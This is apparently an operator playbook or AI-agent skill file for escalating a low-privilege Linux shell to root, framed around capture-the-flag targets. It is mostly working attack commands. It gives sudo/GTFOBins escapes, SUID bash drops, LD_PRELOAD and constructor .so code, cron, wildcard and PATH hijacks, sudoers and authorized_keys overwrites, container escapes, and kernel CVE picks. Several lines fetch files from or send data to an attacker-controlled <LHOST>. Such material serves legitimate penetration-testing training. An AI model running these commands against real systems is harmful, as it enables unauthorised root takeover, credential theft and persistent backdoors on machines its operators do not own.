---
name: Linux Privilege Escalation
description: Escalate from a low-priv Linux shell to root via sudo/GTFOBins, SUID/SGID, capabilities, cron/timer/service abuse, PATH/LD_PRELOAD hijacks, writable configs, dangerous groups, kernel CVEs, and reused/readable credentials — then prove it.
tags: [linux, privilege-escalation, sudo, gtfobins, suid, capabilities, cron, kernel]
recommended_tools: [execute_command, run_in_session, upload_file, msfconsole]
vuln_classes: [privilege_escalation]
domain: privesc
phase: privilege-escalation
---
# Linux Privilege Escalation

Goal: go from your current user to **uid=0(root)** (or a more privileged user en route).
Enumerate first, then pick the highest-confidence primitive. After each step READ the output,
REASON about what it unlocked, and PROOF it. Universal proof for most techniques below:
```
cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf; /tmp/0xdf -p   # SUID root bash → euid=0
# or drop your pubkey: echo '<PUBKEY>' >> /root/.ssh/authorized_keys; ssh -i <KEY> root@<TARGET>
id   # expect uid=0(root); then: cat /root/root.txt
```
Tooling: `linpeas.sh`, `pspy64` (watch cron/root procs without root), `LinEnum`, GTFOBins.

## 0. Triage — always run first
```
id; sudo -l 2>/dev/null           # groups + PASSWORD-LESS sudo rules = fastest win
find / -perm -4000 -type f 2>/dev/null      # SUID
getcap -r / 2>/dev/null                      # file capabilities
ss -tlnp; netstat -tlnp                      # localhost-only services (pivot targets)
cat ~/.bash_history ~/.*_history 2>/dev/null # typed passwords
uname -a; cat /etc/os-release                # kernel + distro → CVE eligibility
./pspy64                                      # observe root cron/timers/services live
./linpeas.sh -a
```
Decision order (fastest → slowest): **sudo -l → creds/reuse → SUID/caps → cron/service/writable →
PATH/LD_PRELOAD → dangerous group → kernel CVE**.

## sudo -l — the single most common root path
Read every rule. `NOPASSWD` + a listed binary is usually instant root.

### GTFOBins — the binary itself escapes
Look the binary up on GTFOBins; most have a one-liner. High-frequency examples:
```
sudo nmap -script=x.sh              # single dash bypasses --script filter; x.sh: os.execute("/bin/bash")
sudo /usr/bin/systemctl status x    # small terminal → less pager → !sh
sudo nano /etc/x                    # ^R ^X → reset; bash 1>&0 2>&0
sudo apport-cli -c x.crash          # view report (V) → less → !/bin/bash   (CVE-2023-1326)
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x        # ProxyCommand shell
sudo tcpdump -i lo -w /dev/null -W1 -G1 -z $TF -Z root   # -z runs $TF as root
sudo bee eval 'system("bash");'                   # Backdrop CLI
sudo mosh-server                   # prints MOSH_KEY+port → mosh-client 127.0.0.1 <PORT> = root
sudo wget --input-file /root/root.txt          # bad-scheme error echoes protected file (read)
sudo wget -O /etc/sudoers http://<LHOST>/sudoers   # -O overwrites any root file (also /etc/shadow, SUID)
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh   # tar exec
sudo python2 test.py               # if script calls input(): __import__("os").system("bash") (py2 input==eval)
```
PROOF: interactive `#` prompt / `id` shows uid=0.

### Sudo env-var / SETENV abuse
When `env_keep`/`SETENV`/`!env_reset` preserves attacker vars into a root-run script:
```
BASH_ENV=/dev/shm/x.sh sudo <script>          # x.sh contains /bin/bash — sourced as root
sudo LD_PRELOAD=/tmp/shell.so <script>        # constructor .so runs as root
sudo PERL5OPT=-d PERL5DB='system("cp /bin/bash /tmp/0xdf;chmod 6777 /tmp/0xdf")' <perl-script>
sudo http_proxy=http://<LHOST>:8080 <script>  # MITM its XML/HTTP fetch → inject XXE / payload
sudo terraform ... apply                       # HOME preserved → ~/.terraformrc dev_overrides provider
```
Build a preload/constructor `.so`: `gcc -shared -fPIC -nostartfiles -o /tmp/shell.so shell.c`
(`void _init(){setuid(0);system("cp /bin/bash /tmp/0xdf;chmod 6777 /tmp/0xdf");}`).

### Sudo wrapper/app abuse (tool runs your code as root)
Any sudo-allowed tool that loads a module/config/script/package YOU control:
```
sudo facter --custom-dir /tmp/ exploit          # loads attacker Ruby fact
sudo needrestart -c /tmp/x.conf                 # Perl config exec'd: exec "/bin/bash";
sudo bbot -p ./x.yml                            # loads attacker Python module_dir
sudo restic check --password-command 'cp /bin/bash /tmp/0xdf'   # cmd runs as root (also Backrest/Duplicati)
sudo npbackup-cli -c /dev/shm/x.conf --dump /root/.ssh/id_rsa   # attacker config includes /root
sudo pip3 download <URL>/pkg.tar.gz             # malicious setup.py runs (CVE-2022-40897)
sudo pacman -U evil.pkg.tar.zst                 # install script/hook runs as root
sudo -u x git clone 'ext::sh -c x.sh'           # GitPython ext:: RCE (CVE-2022-24439)
sudo prusaslicer -s x.3mf                       # 3MF post-processing script (CVE-2023-47268)
sudo clamscan exploit.dmg                        # DMG XXE reads root file (CVE-2023-20052)
sudo qpdf --add-attachment /root/.ssh/id_rsa -- o.pdf   # embed+exfil root file
sudo charcol fetch <URL> -o /root/.ssh/authorized_keys  # root-owned fetch/cron
sudo nginx -c /dev/shm/x.conf                   # 'user root;' + WebDAV PUT, or error_log→/etc/ld.so.preload
sudo pip install .                              # attacker setup.py runs as root during install
sudo /usr/bin/git pull                          # unintended: attacker .git/hooks/post-merge runs as root
sudo restic backup -r rest:http://127.0.0.1:<PORT>/x /root   # exfil root files to attacker rest-server repo
sudo /home/x/.monit cmd $(echo <CMD>|base64)    # custom wrapper base64-decodes arg and execs as root
```
Read the script's source (often in Git/Gitea) before choosing the primitive.

### Sudo argument / path abuse
```
sudo -h other.<DOMAIN> -i          # hostname spoof to permissive host-alias rule (CVE-2025-32462)
sudo --chroot newroot true         # nsswitch.conf loads attacker NSS lib (CVE-2025-32463)
EDITOR='vim -- /root/target' sudoedit -u x /allowed/file   # sudoedit arg injection (CVE-2023-22809)
sudo <binary_calling_./relative>   # cd /dev/shm; drop malicious ./initdb.sh, ./full-checkup.sh, ./tar
sudo backy.sh task.json            # jq '../' filter bypass with '/var/....//root/' → archive /root
sudo tcpdump ... -Z root -w /etc/sudoers.d/x   # duplicate -w/-r arg injection writes root file
sudo iptables-save -f /root/.ssh/authorized_keys   # SSH key smuggled in --comment
sudo below                         # symlink error log → /etc/passwd world-writable (CVE-2025-27591)
sudo /opt/acl.sh (symlink /etc/passwd)         # setfacl follows symlink → write /etc/passwd
sudo genlabel '<SQLi>'             # SQLi → ps2pdf -dNOSAFER PostScript file write
sudo script.py '<USER> -u root cat /root/root.txt'   # arg injection: user string reaches ['sudo','-u',user]+cmd.split()
sudo apt-get upgrade               # env_keep http_proxy → attacker proxy serves backdoored .deb (postinst as root)
sudo changename.sh                 # ifcfg network-script: value 'a /bin/bash' → ifup parses space as command
mv job job.bak; mkdir job; echo 'pty.spawn("bash")' > job/run.py; sudo /usr/bin/python3 job/run.py  # dir move-and-replace
```
`sudo -u`/wrapper script imports a stdlib module (e.g. `subprocess.py`) from its own writable dir →
drop a malicious `subprocess.py`/`os.py` alongside it for import hijack as root.
Watch for unquoted `[[ $a == $b ]]` glob comparisons — inject `*` to leak secrets byte-by-byte,
or feed `echo "*"` to force a match; recover the leaked password from `pspy` cmdline.

### Full sudo
`(ALL : ALL) ALL` / `(ALL) NOPASSWD: ALL` → `sudo -i`. PROOF: root shell.

## Credentials — reuse, readable, recovered
Cheapest wins; always try before exploits.
```
su - <USER>  /  su -             # reuse cracked DB/app/web password for a local user or root
sshpass -p '<PASS>' ssh <USER>@<TARGET>
```
Hunt sources: source code/config (`login.php`, hardcoded arrays), `.bash_history`,
`/etc/hostapd/*.eap_user`, DB dumps, KeePass/`.kdbx` (kpcli), SolarPuTTY/PuTTY `.ppk`
(`puttygen k.ppk -O private-openssh -o out`), print spools, backup archives (bcrypt in config.json).
Readable private keys → `ssh -i <KEY> root@<TARGET>`. Depix for pixelated screenshots.
`adm` group → `grep -i pass /var/log/apache2/access.log` (GET-login creds).
`strace -p <pid>` (if `ptrace_scope=0`) captures a password typed into a running process.
`grub` group → readable initrd: `zcat /boot/initrd.img-<v> | cpio -idm`, run embedded `./uinitrd <arg>`
to derive the root password hash. `HashiCorp Vault` (`VAULT_ADDR`+`~/.vault-token`): `vault ssh
-mode=otp -role=root_otp root@127.0.0.1`. `video` group → `cat /dev/fb0 > shot.raw` then render RGB565
in GIMP to read a password shown on the console.
PROOF: shell as target user / `cat user.txt|root.txt`.

### SSH CA / cert forging
Readable CA private key + `TrustedUserCAKeys` in sshd → forge a root cert:
```
ssh-keygen -t ed25519 -f rootkey
ssh-keygen -s ca_key -I id -n root rootkey.pub
ssh -i rootkey root@<TARGET>
```
PROOF: SSH login as root. (Unquoted-glob sudo scripts can leak the CA key byte-by-byte.)
If `doas`/`sudo` lets you run `ssh-keygen` **as the CA user**, sign your key for the principal that
sshd's `AuthorizedPrincipalsCommand` maps to root:
`doas -u userca ssh-keygen -s /home/userca/ca -I id -n <ROOT_PRINCIPAL> key.pub`.

## SUID/SGID binaries
```
find / -perm -4000 -type f 2>/dev/null
```
Known SUID on GTFOBins → direct escape. Custom SUID binaries: reverse with `strings`/Ghidra and hunt:
- **PATH hijack** — unqualified command call (`ndsudo nvme`, `notes`→`tar`): `PATH=/dev/shm:$PATH <suid>`
  with a malicious `nvme`/`tar` in `/dev/shm`. (CVE-2024-32019)
- **Relative .so load** — `strace -f <suid> 2>&1 | grep '\.so'`, drop malicious `.so` in the loaded path.
- **Path traversal** — `<suid> ../../../home/x/.ssh/id_rsa` reads other users' files.
- **Command/SQL injection** — argv reaches `popen`/`system`/`sqlite3` (`edit()`, `load_extension()`).
- **Memory corruption** — format-string canary leak + BOF/ROP, UAF, integer-overflow file-write.
- **enlightenment_sys** `/dev/..` path mishandling (CVE-2022-37706); **firejail** `--join` (CVE-2022-31214).
- **jjs** (Java Nashorn) → `var fw=new (Java.type('java.io.FileWriter'))('/root/.ssh/authorized_keys');fw.write('<KEY>');fw.close();`
- **gosu** → `gosu root:root bash`. **Xorg** → `Xorg -fp "<cron line>" -logfile /etc/cron.d/x :1` writes any root file (CVE-2018-14665).
- **Predictable/relative helper** — SUID calls `system("/tmp/listusers")` or a bare `sudo`: drop `echo sh >/tmp/listusers`
  (or `printf '#!/bin/sh\n/bin/sh' >/tmp/sudo; export PATH=/tmp:$PATH`) then run the binary.
PROOF: `/tmp/0xdf -p` → uid=0, or arbitrary read of `/root/.ssh/id_rsa`.

## Capabilities
```
getcap -r / 2>/dev/null
```
- `cap_setuid+ep` on `python`/`perl` → `python3 -c 'import os;os.setuid(0);os.system("bash")'`
- `cap_dac_read_search` → read any root file (or byte-by-byte via a partial-hash oracle).
- `cap_net_raw` on `reaver`/`tcpdump` → crack WPS/sniff creds.
- `cap_sys_module` (container) → `insmod` malicious `.ko` for host root shell.
- `=ep` (full caps, e.g. copied `openssl`) → `CAP_DAC_OVERRIDE` write any root file:
  `./openssl enc -d -base64 -out /etc/sudoers < edited.b64` to add your sudoers line.
PROOF: uid=0 / recovered root credential / read `/root/.ssh/id_rsa`.

## Cron, timers & root-run services
Run `pspy64` to catch scheduled/triggered commands and their full paths. Then, by cause:

### Writable script / config the root job consumes
Overwrite it (back up original first) to drop SUID bash or a reverse shell:
```
mv job.sh job.sh.bak; printf '#!/bin/bash\ncp /bin/bash /tmp/0xdf;chmod 6777 /tmp/0xdf\n' > job.sh; chmod +x job.sh
# world-writable YAML/config (/dev/shm), gnuplot .plt (system()), Rust crate src, PHP config, pg data dir
```
### PATH / library / CWD hijack in the job
Root job calls an unqualified binary or loads a lib from a writable CWD (ImageMagick `libxcb.so.1`
CVE-2024-41817, apache module via `apxs`, custom `.so`) → plant the file it will load.
### Wildcard argument injection (root job runs `cmd *` in a writable dir)
Drop filenames that become options. `tar` → `touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'`;
`rsync -a *.rdb` → `touch -- '-e sh p.rdb'`; `7za a ... *` → `touch @x; ln -sf /root/root.txt x`
(reads file into the error log); `chmod 777 -R *` → symlink a target into the tree, then edit it once 777.
### Integrity-checked jobs — race or forge
- **TOCTOU** md5/hash-then-exec: swap content via `mkfifo` named pipe between check and exec.
  Symlink race on a check-then-read backup script: `ln -sf /root/root.txt <extracted>/x` in the window
  leaks the file into the diff/error output. Attacker-supplied tar extracted by root preserving
  `--owner=root` + SUID bits plants a persistent SUID-root binary.
- **Signed ELF** with reused signing key → `elf-sign` a malicious binary.
- **Bash arithmetic/glob injection** via a log line the job parses (`x[$(...)]` in `[[ -eq ]]`).
- **binwalk** path traversal on a file dropped in a watched dir (CVE-2022-4510).
### Config/value the root job interprets
- **curl `-K`** config file → add `url=http://<LHOST>/x` + `output=/usr/bin/passwd` to overwrite a root binary.
- **supervisor `.ini`** in a user-owned dir → replace `command=` with a reverse shell.
- **DB config value** exec'd by a cron script (`UPDATE config SET checkrelease="socat ...")`.
- **Filename → `exec()`/`system()`** in a cron PHP/script: `touch '/uploads/a; <B64>|base64 -d|sh; b'`.
- **chkrootkit 0.49** on cron → `echo '<revshell>' > /tmp/update; chmod +x /tmp/update` (CVE-2014-0476).
- **Logstash** exec pipeline polling a writable dir → write the trigger file it matches.
PROOF: `/tmp/0xdf -p` → uid=0 (or reverse shell from the cron user).

## Localhost-only services running as root
`ss -tlnp` reveals internal services; tunnel with `ssh -L <PORT>:localhost:<PORT> <USER>@<TARGET>`.
Common root-service RCE primitives:
```
Consul (acl_default_policy allow)  → register a service health-check running your command
etcd/remco template                → newline-inject Apache CustomLog "|cp ... authorized_keys"
PostgreSQL superuser               → COPY ... FROM/TO PROGRAM (also .profile TIOCSTI pushback)
Erlang SSH (:2222)                 → os:cmd('cp /bin/bash /tmp/0xdf').
pyLoad (:9666)                     → /flash/addcrypted2 jk pyimport (CVE-2023-0297)
ZoneMinder (:8080)                 → snapshot monitor_ids injection (CVE-2023-26035); zmupdate.pl -u qx
Crontab UI / TeamCity / Jenkins / Backrest / ISPConfig / Gitea (all root) → add job / build step / RCE
ChromeDriver (:9515)/Selenium      → goog:chromeOptions.binary, or chrome://inspect hijack a session
LibreOffice UNO (:2002)            → SystemShellExecute
H2 console (:8082, no auth)        → CREATE ALIAS ... Runtime.getRuntime().exec, or Backup+symlink read
Ajenti (:8000) / Webmin (:10000)   → login as root → web terminal / package-updates.cgi cmd injection (CVE-2019-12840)
JDWP (localhost debug port)        → ssh -L tunnel + jdwp-shellifier.py --cmd (Tomcat/Java as root)
Xvnc (root, -rfbauth)              → recover the stored VNC passwd file from home/backup
rsyslog→PostgreSQL template        → logger with stacked-query SQLi in an unsanitized insert
local AES/CBC service (Invalid Padding error) → padding-oracle decrypt an encrypted credential
NSS-backed PostgreSQL              → INSERT a uid-0 row into passwd_table, then su that user
# generic: eval()/f-string/newline/User-Agent injection in a root Flask/Thrift/log service
```
Rootkit backdoors: Apache `mod_rootme.so` (magic HTTP `GET <string>` → root shell) or a malicious
LKM comparing input to a magic string (`echo g3tPr1v > /dev/ttyR0` sets caller creds to 0) — reverse
the `.so`/`.ko` to derive the trigger.
PROOF: `id`→uid=0 in the service, SUID bash, or key written to `/root/.ssh/authorized_keys`.

## Writable service unit / config / included file
```
find / -writable -type f 2>/dev/null | grep -E 'systemd|\.service|\.timer|/etc/'
find / -group $(id -gn) -writable 2>/dev/null
```
Writable `.service`/config included by a root process → inject `ExecStart`/`system()` and restart.
Group-writable PHP config included by a root `php -S` → append `system('cp /bin/bash ...')`.

## Dangerous group membership
```
id   # look for: docker, lxd, disk, adm, sudo, wheel, management, jailer, dev
```
- **docker** → `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` (or `sudo docker exec --privileged`,
  `docker-compose` with `privileged:true`/host mount). Overlay2 flaw: SUID bash in container run from host path (CVE-2021-41091).
- **lxd/lxc** → import alpine image, launch `security.privileged=true` container, mount host `/`.
- **disk** → `debugfs /dev/sda1` reads any file; write to `/etc/shadow` (or `strings /dev/sda5|grep` swap).
- **adm** → read all logs (recover creds).
- **shared tmux socket** — root runs `tmux -S <sock>` group-readable → `tmux -S <sock> attach` = root shell.
PROOF: root shell / read `/etc/shadow` / read `/root/root.txt`.

## Restricted shells & auth-terminal tricks
- **rbash/rssh escape**: `ssh <USER>@localhost -t bash` (or `-t "bash --noprofile"`); via `ed`/`red` → `!/bin/sh`;
  reset `PATH=/usr/bin:/bin`; `tar --checkpoint-action=exec=/bin/bash`.
- **su ACL/PAM block bypass**: if `getfacl /bin/su` blocks your user, run `su` from an unaffected account
  (e.g. `www-data`). Two shells + known root password but restricted tty: use polkit —
  `pkexec --user root bash -i` in shell 1, authenticate via `pkttyagent --process <PID>` in shell 2.

## Container escape
Beyond `cap_sys_module` above: host bind-mount shared with container-root → drop SUID bash in the
shared dir, execute from host. runc fd-leak `/proc/self/fd/8` workdir (CVE-2024-21626, e.g. via
Portainer). Privileged container → mount host disk, edit `/etc/sudoers` or `/root/.ssh`.

## NFS no_root_squash
```
showmount -e <TARGET>              # find export with no_root_squash
# attacker (as root): mount -t nfs <TARGET>:/share /mnt; cp /bin/bash /mnt/x; chmod 6777 /mnt/x
/share/x -p                        # on target
```
PROOF: `/x -p` → uid=0.

## Kernel & local CVE exploits (last resort)
Match `uname -r`/distro, then run a vetted PoC. High-frequency:
```
PwnKit          CVE-2021-4034     # pkexec — near-universal, reliable
GameOver(lay)   CVE-2023-2640/32629  # unshare -rm ... setcap cap_setuid+eip python3 ... (Ubuntu overlayfs)
Looney Tunables CVE-2023-4911     # glibc ld.so tunables
Dirty Pipe / DirtyCow             # overwrite root-owned/SUID files
nf_tables       CVE-2023-35001    # netfilter LPE
polkit/udisks   CVE-2025-6018/6019  # allow_active spoof (.pam_environment XDG_SEAT) → udisks resize race
snap-confine    CVE-2026-3888     # /tmp/.snap race
nested userns   CVE-2018-18955    # idmap LPE (unprivileged user namespaces enabled)
                CVE-2017-16995    # eBPF verifier (Ubuntu 16.04, 4.4.0-116)
```
Also: SUID GNU `screen 4.5.0` (CVE-2017-5618) writes `/etc/ld.so.preload` for a root shell; a custom
kernel driver exposing a mappable `cred` struct → `mmap` it and zero your uid.
PROOF: uid=0 root shell; `cat /root/root.txt`.

## Escalation checklist
1. `sudo -l` — GTFOBins / env / wrapper / arg abuse.
2. Credentials — reuse (`su`), readable keys, history, logs, backups, KeePass.
3. `find -perm -4000` + `getcap` — SUID/cap escapes and custom-binary bugs.
4. `pspy64` — cron/timer/service: writable script, PATH/lib hijack, race/forge.
5. `ss -tlnp` — localhost root services → tunnel + RCE.
6. Writable units/configs; dangerous groups (docker/lxd/disk/adm); container escape; NFS.
7. Kernel/local CVE only when nothing else lands.

Always end with PROOF: `id` (uid=0) and read `/root/root.txt`.
